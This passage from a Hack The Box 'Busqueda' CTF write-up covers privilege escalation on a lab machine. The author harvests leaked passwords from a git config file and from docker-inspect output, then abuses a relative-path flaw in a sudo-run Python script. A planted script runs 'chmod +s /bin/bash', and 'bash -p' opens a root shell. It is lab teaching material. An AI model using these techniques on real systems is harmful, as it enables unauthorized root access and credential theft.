<span class="nd">svc@busqueda</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">app</span><span class="o">/.</span><span class="n">git</span><span class="err">$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">la</span>
<span class="n">total</span> <span class="mi">52</span>
<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">8</span> <span class="n">www</span><span class="o">-</span><span class="n">data</span> <span class="n">www</span><span class="o">-</span><span class="n">data</span> <span class="mi">4096</span> <span class="n">Jun</span> <span class="mi">24</span> <span class="mi">19</span><span class="p">:</span><span class="mi">33</span> <span class="o">.</span>
<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">4</span> <span class="n">www</span><span class="o">-</span><span class="n">data</span> <span class="n">www</span><span class="o">-</span><span class="n">data</span> <span class="mi">4096</span> <span class="n">Apr</span>  <span class="mi">3</span> <span class="mi">14</span><span class="p">:</span><span class="mi">32</span> <span class="o">..</span>
<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">2</span> <span class="n">www</span><span class="o">-</span><span class="n">data</span> <span class="n">www</span><span class="o">-</span><span class="n">data</span> <span class="mi">4096</span> <span class="n">Dec</span>  <span class="mi">1</span>  <span class="mi">2022</span> <span class="n">branches</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span> <span class="mi">1</span> <span class="n">www</span><span class="o">-</span><span class="n">data</span> <span class="n">www</span><span class="o">-</span><span class="n">data</span>   <span class="mi">15</span> <span class="n">Dec</span>  <span class="mi">1</span>  <span class="mi">2022</span> <span class="n">COMMIT_EDITMSG</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span> <span class="mi">1</span> <span class="n">www</span><span class="o">-</span><span class="n">data</span> <span class="n">www</span><span class="o">-</span><span class="n">data</span>  <span class="mi">294</span> <span class="n">Dec</span>  <span class="mi">1</span>  <span class="mi">2022</span> <span class="n">config</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span> <span class="mi">1</span> <span class="n">www</span><span class="o">-</span><span class="n">data</span> <span class="n">www</span><span class="o">-</span><span class="n">data</span>   <span class="mi">73</span> <span class="n">Dec</span>  <span class="mi">1</span>  <span class="mi">2022</span> <span class="n">description</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span> <span class="mi">1</span> <span class="n">www</span><span class="o">-</span><span class="n">data</span> <span class="n">www</span><span class="o">-</span><span class="n">data</span>   <span class="mi">21</span> <span class="n">Dec</span>  <span class="mi">1</span>  <span class="mi">2022</span> <span class="n">HEAD</span>
<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">2</span> <span class="n">www</span><span class="o">-</span><span class="n">data</span> <span class="n">www</span><span class="o">-</span><span class="n">data</span> <span class="mi">4096</span> <span class="n">Dec</span>  <span class="mi">1</span>  <span class="mi">2022</span> <span class="n">hooks</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span> <span class="mi">1</span> <span class="n">root</span>     <span class="n">root</span>      <span class="mi">259</span> <span class="n">Apr</span>  <span class="mi">3</span> <span class="mi">15</span><span class="p">:</span><span class="mi">09</span> <span class="n">index</span>
<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">2</span> <span class="n">www</span><span class="o">-</span><span class="n">data</span> <span class="n">www</span><span class="o">-</span><span class="n">data</span> <span class="mi">4096</span> <span class="n">Dec</span>  <span class="mi">1</span>  <span class="mi">2022</span> <span class="n">info</span>
<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">3</span> <span class="n">www</span><span class="o">-</span><span class="n">data</span> <span class="n">www</span><span class="o">-</span><span class="n">data</span> <span class="mi">4096</span> <span class="n">Dec</span>  <span class="mi">1</span>  <span class="mi">2022</span> <span class="n">logs</span>
<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">9</span> <span class="n">www</span><span class="o">-</span><span class="n">data</span> <span class="n">www</span><span class="o">-</span><span class="n">data</span> <span class="mi">4096</span> <span class="n">Dec</span>  <span class="mi">1</span>  <span class="mi">2022</span> <span class="n">objects</span>
<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">5</span> <span class="n">www</span><span class="o">-</span><span class="n">data</span> <span class="n">www</span><span class="o">-</span><span class="n">data</span> <span class="mi">4096</span> <span class="n">Dec</span>  <span class="mi">1</span>  <span class="mi">2022</span> <span class="n">refs</span>
<span class="nd">svc@busqueda</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">app</span><span class="o">/.</span><span class="n">git</span><span class="err">$</span>
</pre></div>

We list its contents and can see that it displays the password for the user "cody," apparently for connecting to a database:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">svc@busqueda</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">app</span><span class="o">/.</span><span class="n">git</span><span class="err">$</span> <span class="n">cat</span> <span class="n">config</span>
<span class="p">[</span><span class="n">core</span><span class="p">]</span>
    <span class="n">repositoryformatversion</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="n">filemode</span> <span class="o">=</span> <span class="n">true</span>
    <span class="n">bare</span> <span class="o">=</span> <span class="n">false</span>
    <span class="n">logallrefupdates</span> <span class="o">=</span> <span class="n">true</span>
<span class="p">[</span><span class="n">remote</span> <span class="s2">"origin"</span><span class="p">]</span>
    <span class="n">url</span> <span class="o">=</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">cody</span><span class="p">:</span><span class="n">jh1usoih2bkjaspwe92</span><span class="nd">@gitea</span><span class="o">.</span><span class="n">searcher</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span><span class="n">cody</span><span class="o">/</span><span class="n">Searcher_site</span><span class="o">.</span><span class="n">git</span>
    <span class="n">fetch</span> <span class="o">=</span> <span class="o">+</span><span class="n">refs</span><span class="o">/</span><span class="n">heads</span><span class="o">/*</span><span class="p">:</span><span class="n">refs</span><span class="o">/</span><span class="n">remotes</span><span class="o">/</span><span class="n">origin</span><span class="o">/*</span>
<span class="p">[</span><span class="n">branch</span> <span class="s2">"main"</span><span class="p">]</span>
    <span class="n">remote</span> <span class="o">=</span> <span class="n">origin</span>
    <span class="n">merge</span> <span class="o">=</span> <span class="n">refs</span><span class="o">/</span><span class="n">heads</span><span class="o">/</span><span class="n">main</span>
<span class="nd">svc@busqueda</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">app</span><span class="o">/.</span><span class="n">git</span><span class="err">$</span>
</pre></div>

We can verify if the password <code>jh1usoih2bkjaspwe92</code> also belongs to the current user <code>svc</code>:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">svc@busqueda</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">app</span><span class="o">/.</span><span class="n">git</span><span class="err">$</span> <span class="n">sudo</span> <span class="o">-</span><span class="n">l</span>
<span class="p">[</span><span class="n">sudo</span><span class="p">]</span> <span class="n">password</span> <span class="k">for</span> <span class="n">svc</span><span class="p">:</span> 
<span class="n">Matching</span> <span class="n">Defaults</span> <span class="n">entries</span> <span class="k">for</span> <span class="n">svc</span> <span class="n">on</span> <span class="n">busqueda</span><span class="p">:</span>
    <span class="n">env_reset</span><span class="p">,</span> <span class="n">mail_badpass</span><span class="p">,</span>
    <span class="n">secure_path</span><span class="o">=/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">sbin</span>\<span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="nb">bin</span>\<span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span>\<span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span>\<span class="p">:</span><span class="o">/</span><span class="n">sbin</span>\<span class="p">:</span><span class="o">/</span><span class="nb">bin</span>\<span class="p">:</span><span class="o">/</span><span class="n">snap</span><span class="o">/</span><span class="nb">bin</span><span class="p">,</span>
    <span class="n">use_pty</span>

<span class="n">User</span> <span class="n">svc</span> <span class="n">may</span> <span class="n">run</span> <span class="n">the</span> <span class="n">following</span> <span class="n">commands</span> <span class="n">on</span> <span class="n">busqueda</span><span class="p">:</span>
    <span class="p">(</span><span class="n">root</span><span class="p">)</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">python3</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">scripts</span><span class="o">/</span><span class="n">system</span><span class="o">-</span><span class="n">checkup</span><span class="o">.</span><span class="n">py</span> <span class="o">*</span>
<span class="nd">svc@busqueda</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">app</span><span class="o">/.</span><span class="n">git</span><span class="err">$</span>
</pre></div>

Indeed, we have obtained the password of the user we are working with, and we have the necessary privileges to execute a Python script as the root user.<br/><br/>
Before investigating what we can do with this script, in the <code>config</code> file, we can also see the presence of a subdomain: <code>gitea.searcher.htb</code>.<br/><br/>
I will add this subdomain to my local machine's <code>/etc/hosts</code> file.<br/><br/>
<div class="highlight"><pre><span></span><span class="c1"># Host addresses</span>
<span class="mf">127.0.0.1</span>  <span class="n">localhost</span>
<span class="mf">127.0.1.1</span>  <span class="n">Parrot</span>
<span class="p">::</span><span class="mi">1</span>        <span class="n">localhost</span> <span class="n">ip6</span><span class="o">-</span><span class="n">localhost</span> <span class="n">ip6</span><span class="o">-</span><span class="n">loopback</span>
<span class="n">ff02</span><span class="p">::</span><span class="mi">1</span>    <span class="n">ip6</span><span class="o">-</span><span class="n">allnodes</span>
<span class="n">ff02</span><span class="p">::</span><span class="mi">2</span>    <span class="n">ip6</span><span class="o">-</span><span class="n">allrouters</span>

<span class="c1"># HackTheBox</span>
<span class="mf">10.10.11.208</span> <span class="n">searcher</span><span class="o">.</span><span class="n">htb</span> <span class="n">gitea</span><span class="o">.</span><span class="n">searcher</span><span class="o">.</span><span class="n">htb</span>
</pre></div>
<h4>Gitea Service</h4>
Let's take a look at the web service hosted on the subdomain <code>gitea.searcher.htb</code>.<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/easy/busqueda/img/14.png"/><br/><br/>
We navigate to the authentication section.<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/easy/busqueda/img/15.png"/><br/><br/>
We can try using the credentials we obtained from the config file to authenticate:<br/><br/>
<div class="highlight"><pre><span></span><span class="n">Username</span><span class="p">:</span> <span class="n">cody</span>
<span class="n">Password</span><span class="p">:</span> <span class="n">jh1usoih2bkjaspwe92</span>
</pre></div>
<img alt="" src="https://elswix.github.io/writeups/htb/easy/busqueda/img/18.png"/><br/><br/>
We can verify that the credentials are correct and observe that there are repositories available:<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/easy/busqueda/img/19.png"/><br/><br/>
These repositories are not useful to us since we already have access to them from the machine. However, it is interesting to note the existence of a user named <code>administrator</code>.<br/><br/>
Unfortunately, we cannot view the content or modify the script as the directory it is located in belongs to the root user and does not allow reading of its files.<br/><br/>
Next, we will execute the script exactly as shown using the <code>sudo -l</code> command, but adding <code>sudo</code> at the beginning of the command:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">svc@busqueda</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">scripts</span><span class="err">$</span> <span class="n">sudo</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">python3</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">scripts</span><span class="o">/</span><span class="n">system</span><span class="o">-</span><span class="n">checkup</span><span class="o">.</span><span class="n">py</span> <span class="o">*</span>
<span class="n">Usage</span><span class="p">:</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">scripts</span><span class="o">/</span><span class="n">system</span><span class="o">-</span><span class="n">checkup</span><span class="o">.</span><span class="n">py</span> <span class="o">&lt;</span><span class="n">action</span><span class="o">&gt;</span> <span class="p">(</span><span class="n">arg1</span><span class="p">)</span> <span class="p">(</span><span class="n">arg2</span><span class="p">)</span>

     <span class="n">docker</span><span class="o">-</span><span class="n">ps</span>     <span class="p">:</span> <span class="n">List</span> <span class="n">running</span> <span class="n">docker</span> <span class="n">containers</span>
     <span class="n">docker</span><span class="o">-</span><span class="n">inspect</span> <span class="p">:</span> <span class="n">Inpect</span> <span class="n">a</span> <span class="n">certain</span> <span class="n">docker</span> <span class="n">container</span>
     <span class="n">full</span><span class="o">-</span><span class="n">checkup</span>  <span class="p">:</span> <span class="n">Run</span> <span class="n">a</span> <span class="n">full</span> <span class="n">system</span> <span class="n">checkup</span>

<span class="nd">svc@busqueda</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">scripts</span><span class="err">$</span>
</pre></div>

Let's try running the <code>docker-ps</code> option. This option, as indicated in the help panel, will allow us to list the Docker containers that are currently running on the system.<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">svc@busqueda</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">scripts</span><span class="err">$</span> <span class="n">sudo</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">python3</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">scripts</span><span class="o">/</span><span class="n">system</span><span class="o">-</span><span class="n">checkup</span><span class="o">.</span><span class="n">py</span> <span class="n">docker</span><span class="o">-</span><span class="n">ps</span>

<span class="n">CONTAINER</span> <span class="n">ID</span>   <span class="n">IMAGE</span>                <span class="n">COMMAND</span>                  <span class="n">CREATED</span>        <span class="n">STATUS</span>       <span class="n">PORTS</span>                                             <span class="n">NAMES</span>
<span class="mf">960873171e2</span><span class="n">e</span>   <span class="n">gitea</span><span class="o">/</span><span class="n">gitea</span><span class="p">:</span><span class="n">latest</span>   <span class="s2">"/usr/bin/entrypointâ€¦"</span>   <span class="mi">5</span> <span class="n">months</span> <span class="n">ago</span>   <span class="n">Up</span> <span class="mi">3</span> <span class="n">hours</span>   <span class="mf">127.0.0.1</span><span class="p">:</span><span class="mi">3000</span><span class="o">-&gt;</span><span class="mi">3000</span><span class="o">/</span><span class="n">tcp</span><span class="p">,</span> <span class="mf">127.0.0.1</span><span class="p">:</span><span class="mi">222</span><span class="o">-&gt;</span><span class="mi">22</span><span class="o">/</span><span class="n">tcp</span>   <span class="n">gitea</span>
<span class="n">f84a6b33fb5a</span>   <span class="n">mysql</span><span class="p">:</span><span class="mi">8</span>              <span class="s2">"docker-entrypoint.sâ€¦"</span>   <span class="mi">5</span> <span class="n">months</span> <span class="n">ago</span>   <span class="n">Up</span> <span class="mi">3</span> <span class="n">hours</span>   <span class="mf">127.0.0.1</span><span class="p">:</span><span class="mi">3306</span><span class="o">-&gt;</span><span class="mi">3306</span><span class="o">/</span><span class="n">tcp</span><span class="p">,</span> <span class="mi">33060</span><span class="o">/</span><span class="n">tcp</span>               <span class="n">mysql_db</span>

<span class="nd">svc@busqueda</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">scripts</span><span class="err">$</span>
</pre></div>

We can obtain information about the containers running on the system, and it seems that it also allows us to inspect them.<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">svc@busqueda</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">scripts</span><span class="err">$</span> <span class="n">sudo</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">python3</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">scripts</span><span class="o">/</span><span class="n">system</span><span class="o">-</span><span class="n">checkup</span><span class="o">.</span><span class="n">py</span> <span class="n">docker</span><span class="o">-</span><span class="n">inspect</span>

<span class="n">Usage</span><span class="p">:</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">scripts</span><span class="o">/</span><span class="n">system</span><span class="o">-</span><span class="n">checkup</span><span class="o">.</span><span class="n">py</span> <span class="n">docker</span><span class="o">-</span><span class="n">inspect</span> <span class="o">&lt;</span><span class="nb">format</span><span class="o">&gt;</span> <span class="o">&lt;</span><span class="n">container_name</span><span class="o">&gt;</span>

<span class="nd">svc@busqueda</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">scripts</span><span class="err">$</span>
</pre></div>

It's asking us to specify a format. Initially, I wasn't sure what it meant by that, so I looked into Docker's documentation for more information on <a href="https://docs.docker.com/engine/reference/commandline/inspect/">docker-inspect documentation</a>.<br/><br/>
I found several format examples and decided to try each one of them. During testing, one of the formats caught my attention:<br/><br/>
<div class="highlight"><pre><span></span><span class="n">docker</span> <span class="n">inspect</span> <span class="o">--</span><span class="nb">format</span><span class="o">=</span><span class="s1">'{{json .Config}}'</span> <span class="err">$</span><span class="n">INSTANCE_ID</span>
</pre></div>

It appears that this format returns certain container information in JSON format, which we can use to inspect the container. We can try it, for example, with the Gitea container. I used <code>jq</code> to display a more readable output on the screen.<br/><br/>
<div class="highlight"><pre><span></span><span class="n">sudo</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">python3</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">scripts</span><span class="o">/</span><span class="n">system</span><span class="o">-</span><span class="n">checkup</span><span class="o">.</span><span class="n">py</span> <span class="n">docker</span><span class="o">-</span><span class="n">inspect</span> <span class="s2">"{{json .Config}}"</span> <span class="n">gitea</span> <span class="o">|</span> <span class="n">jq</span>
</pre></div>
<div class="highlight"><pre><span></span><span class="p">{</span>
  <span class="s2">"Hostname"</span><span class="p">:</span> <span class="s2">"960873171e2e"</span><span class="p">,</span>
  <span class="s2">"Domainname"</span><span class="p">:</span> <span class="s2">""</span><span class="p">,</span>
  <span class="s2">"User"</span><span class="p">:</span> <span class="s2">""</span><span class="p">,</span>
  <span class="s2">"AttachStdin"</span><span class="p">:</span> <span class="n">false</span><span class="p">,</span>
  <span class="s2">"AttachStdout"</span><span class="p">:</span> <span class="n">false</span><span class="p">,</span>
  <span class="s2">"AttachStderr"</span><span class="p">:</span> <span class="n">false</span><span class="p">,</span>
  <span class="s2">"ExposedPorts"</span><span class="p">:</span> <span class="p">{</span>
    <span class="s2">"22/tcp"</span><span class="p">:</span> <span class="p">{},</span>
    <span class="s2">"3000/tcp"</span><span class="p">:</span> <span class="p">{}</span>
  <span class="p">},</span>
  <span class="s2">"Tty"</span><span class="p">:</span> <span class="n">false</span><span class="p">,</span>
  <span class="s2">"OpenStdin"</span><span class="p">:</span> <span class="n">false</span><span class="p">,</span>
  <span class="s2">"StdinOnce"</span><span class="p">:</span> <span class="n">false</span><span class="p">,</span>
  <span class="s2">"Env"</span><span class="p">:</span> <span class="p">[</span>
    <span class="s2">"USER_UID=115"</span><span class="p">,</span>
    <span class="s2">"USER_GID=121"</span><span class="p">,</span>
    <span class="s2">"GITEA__database__DB_TYPE=mysql"</span><span class="p">,</span>
    <span class="s2">"GITEA__database__HOST=db:3306"</span><span class="p">,</span>
    <span class="s2">"GITEA__database__NAME=gitea"</span><span class="p">,</span>
    <span class="s2">"GITEA__database__USER=gitea"</span><span class="p">,</span>
    <span class="s2">"GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh"</span><span class="p">,</span>
    <span class="s2">"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"</span><span class="p">,</span>
    <span class="s2">"USER=git"</span><span class="p">,</span>
    <span class="s2">"GITEA_CUSTOM=/data/gitea"</span>
  <span class="p">],</span>
  <span class="s2">"Cmd"</span><span class="p">:</span> <span class="p">[</span>
    <span class="s2">"/bin/s6-svscan"</span><span class="p">,</span>
    <span class="s2">"/etc/s6"</span>
  <span class="p">],</span>
  <span class="s2">"Image"</span><span class="p">:</span> <span class="s2">"gitea/gitea:latest"</span><span class="p">,</span>
  <span class="s2">"Volumes"</span><span class="p">:</span> <span class="p">{</span>
    <span class="s2">"/data"</span><span class="p">:</span> <span class="p">{},</span>
    <span class="s2">"/etc/localtime"</span><span class="p">:</span> <span class="p">{},</span>
    <span class="s2">"/etc/timezone"</span><span class="p">:</span> <span class="p">{}</span>
  <span class="p">},</span>
  <span class="s2">"WorkingDir"</span><span class="p">:</span> <span class="s2">""</span><span class="p">,</span>
  <span class="s2">"Entrypoint"</span><span class="p">:</span> <span class="p">[</span>
    <span class="s2">"/usr/bin/entrypoint"</span>
  <span class="p">],</span>
  <span class="s2">"OnBuild"</span><span class="p">:</span> <span class="n">null</span><span class="p">,</span>
  <span class="s2">"Labels"</span><span class="p">:</span> <span class="p">{</span>
    <span class="s2">"com.docker.compose.config-hash"</span><span class="p">:</span> <span class="s2">"e9e6ff8e594f3a8c77b688e35f3fe9163fe99c66597b19bdd03f9256d630f515"</span><span class="p">,</span>
    <span class="s2">"com.docker.compose.container-number"</span><span class="p">:</span> <span class="s2">"1"</span><span class="p">,</span>
    <span class="s2">"com.docker.compose.oneoff"</span><span class="p">:</span> <span class="s2">"False"</span><span class="p">,</span>
    <span class="s2">"com.docker.compose.project"</span><span class="p">:</span> <span class="s2">"docker"</span><span class="p">,</span>
    <span class="s2">"com.docker.compose.project.config_files"</span><span class="p">:</span> <span class="s2">"docker-compose.yml"</span><span class="p">,</span>
    <span class="s2">"com.docker.compose.project.working_dir"</span><span class="p">:</span> <span class="s2">"/root/scripts/docker"</span><span class="p">,</span>
    <span class="s2">"com.docker.compose.service"</span><span class="p">:</span> <span class="s2">"server"</span><span class="p">,</span>
    <span class="s2">"com.docker.compose.version"</span><span class="p">:</span> <span class="s2">"1.29.2"</span><span class="p">,</span>
    <span class="s2">"maintainer"</span><span class="p">:</span> <span class="s2">"maintainers@gitea.io"</span><span class="p">,</span>
    <span class="s2">"org.opencontainers.image.created"</span><span class="p">:</span> <span class="s2">"2022-11-24T13:22:00Z"</span><span class="p">,</span>
    <span class="s2">"org.opencontainers.image.revision"</span><span class="p">:</span> <span class="s2">"9bccc60cf51f3b4070f5506b042a3d9a1442c73d"</span><span class="p">,</span>
    <span class="s2">"org.opencontainers.image.source"</span><span class="p">:</span> <span class="s2">"https://github.com/go-gitea/gitea.git"</span><span class="p">,</span>
    <span class="s2">"org.opencontainers.image.url"</span><span class="p">:</span> <span class="s2">"https://github.com/go-gitea/gitea"</span>
  <span class="p">}</span>
<span class="p">}</span>
</pre></div>

Instantly, my attention was drawn to a password that is leaked in the output again: <code>yuiu1hoiu4i5ho1uh</code>.<br/><br/>
We can check if this password belongs to the <code>administrator</code> user of the Gitea service.<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/easy/busqueda/img/20.png"/><br/><br/>
The credentials are correct, and we can access as the <code>administrator</code> user.<br/><br/>
We notice that the <code>administrator</code> user has a repository named <code>scripts</code>, which is interesting because it matches the name of the folder where the <code>system-checkup.py</code> script is stored.<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/easy/busqueda/img/21.png"/><br/><br/>
We've gained access to the source code of the scripts stored in the directory and can see the source code of the script that we can execute as root.<br/><br/>
Upon inspecting the code, we notice that in the <code>full-checkup</code> option, a Bash script is executed.<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/easy/busqueda/img/23.png"/><br/><br/>
The issue with this is that it searches for the script in the current working directory, which allows us to take advantage of this situation to create our own script in a location where we have permission to write and execute it as root.<br/><br/>
Let's navigate to the <code>/dev/shm</code> directory:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">svc@busqueda</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">scripts</span><span class="err">$</span> <span class="n">cd</span> <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span>
<span class="nd">svc@busqueda</span><span class="p">:</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span><span class="err">$</span> <span class="n">touch</span> <span class="n">full</span><span class="o">-</span><span class="n">checkup</span><span class="o">.</span><span class="n">sh</span>
<span class="nd">svc@busqueda</span><span class="p">:</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span><span class="err">$</span>
</pre></div>

The idea now is to make sure that when this Bash script is executed, it assigns SUID privileges to <code>/bin/bash</code>.<br/><br/>
Let's add the following content to the Bash script:<br/><br/>
<div class="highlight"><pre><span></span><span class="ch">#!/bin/bash</span>
<span class="n">chmod</span> <span class="o">+</span><span class="n">s</span> <span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">bash</span>
</pre></div>

We assign execute privileges to it:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">svc@busqueda</span><span class="p">:</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span><span class="err">$</span> <span class="n">chmod</span> <span class="o">+</span><span class="n">x</span> <span class="n">full</span><span class="o">-</span><span class="n">checkup</span><span class="o">.</span><span class="n">sh</span>
</pre></div>

Finally, let's execute the Python script using <code>sudo</code> and the <code>full-checkup</code> parameter:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">svc@busqueda</span><span class="p">:</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span><span class="err">$</span> <span class="n">sudo</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">python3</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">scripts</span><span class="o">/</span><span class="n">system</span><span class="o">-</span><span class="n">checkup</span><span class="o">.</span><span class="n">py</span> <span class="n">full</span><span class="o">-</span><span class="n">checkup</span>

<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Done</span><span class="err">!</span>
<span class="nd">svc@busqueda</span><span class="p">:</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span><span class="err">$</span>
</pre></div>

We list the privileges of <code>/bin/bash</code>:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">svc@busqueda</span><span class="p">:</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span><span class="err">$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">l</span> <span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">bash</span>
<span class="o">-</span><span class="n">rwsr</span><span class="o">-</span><span class="n">sr</span><span class="o">-</span><span class="n">x</span> <span class="mi">1</span> <span class="n">root</span> <span class="n">root</span> <span class="mi">1396520</span> <span class="n">Jan</span>  <span class="mi">6</span>  <span class="mi">2022</span> <span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">bash</span>
<span class="nd">svc@busqueda</span><span class="p">:</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span><span class="err">$</span>
</pre></div>

We can see that it has the SUID bit enabled. Now, using the "-p" parameter, we can start a shell as root.<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">svc@busqueda</span><span class="p">:</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span><span class="err">$</span> <span class="n">bash</span> <span class="o">-</span><span class="n">p</span>
<span class="n">bash</span><span class="o">-</span><span class="mf">5.1</span><span class="root1">#</span><span class="n"> whoami</span>
<span class="n">root</span>
<span class="n">bash</span><span class="o">-</span><span class="mf">5.1</span><span class="root1">#</span><span class="n"> cat /root/root.txt</span>
<span class="n">d028</span><span class="o">******************</span><span class="mi">6</span><span class="n">ddd62e89af</span>
<span class="n">bash</span><span class="o">-</span><span class="mf">5.1</span><span class="root1">#</span>
</pre></div></br></br></br></br>
            </div>
        </div>
    </section>

    <script src="/js/sidebarToggle.js"></script>
    <script src="/js/fixMobileImages.js"></script>
    <footer>
        <p>&copy; 2024 elswix.github.io</p>
    </footer>
</body>
</html>
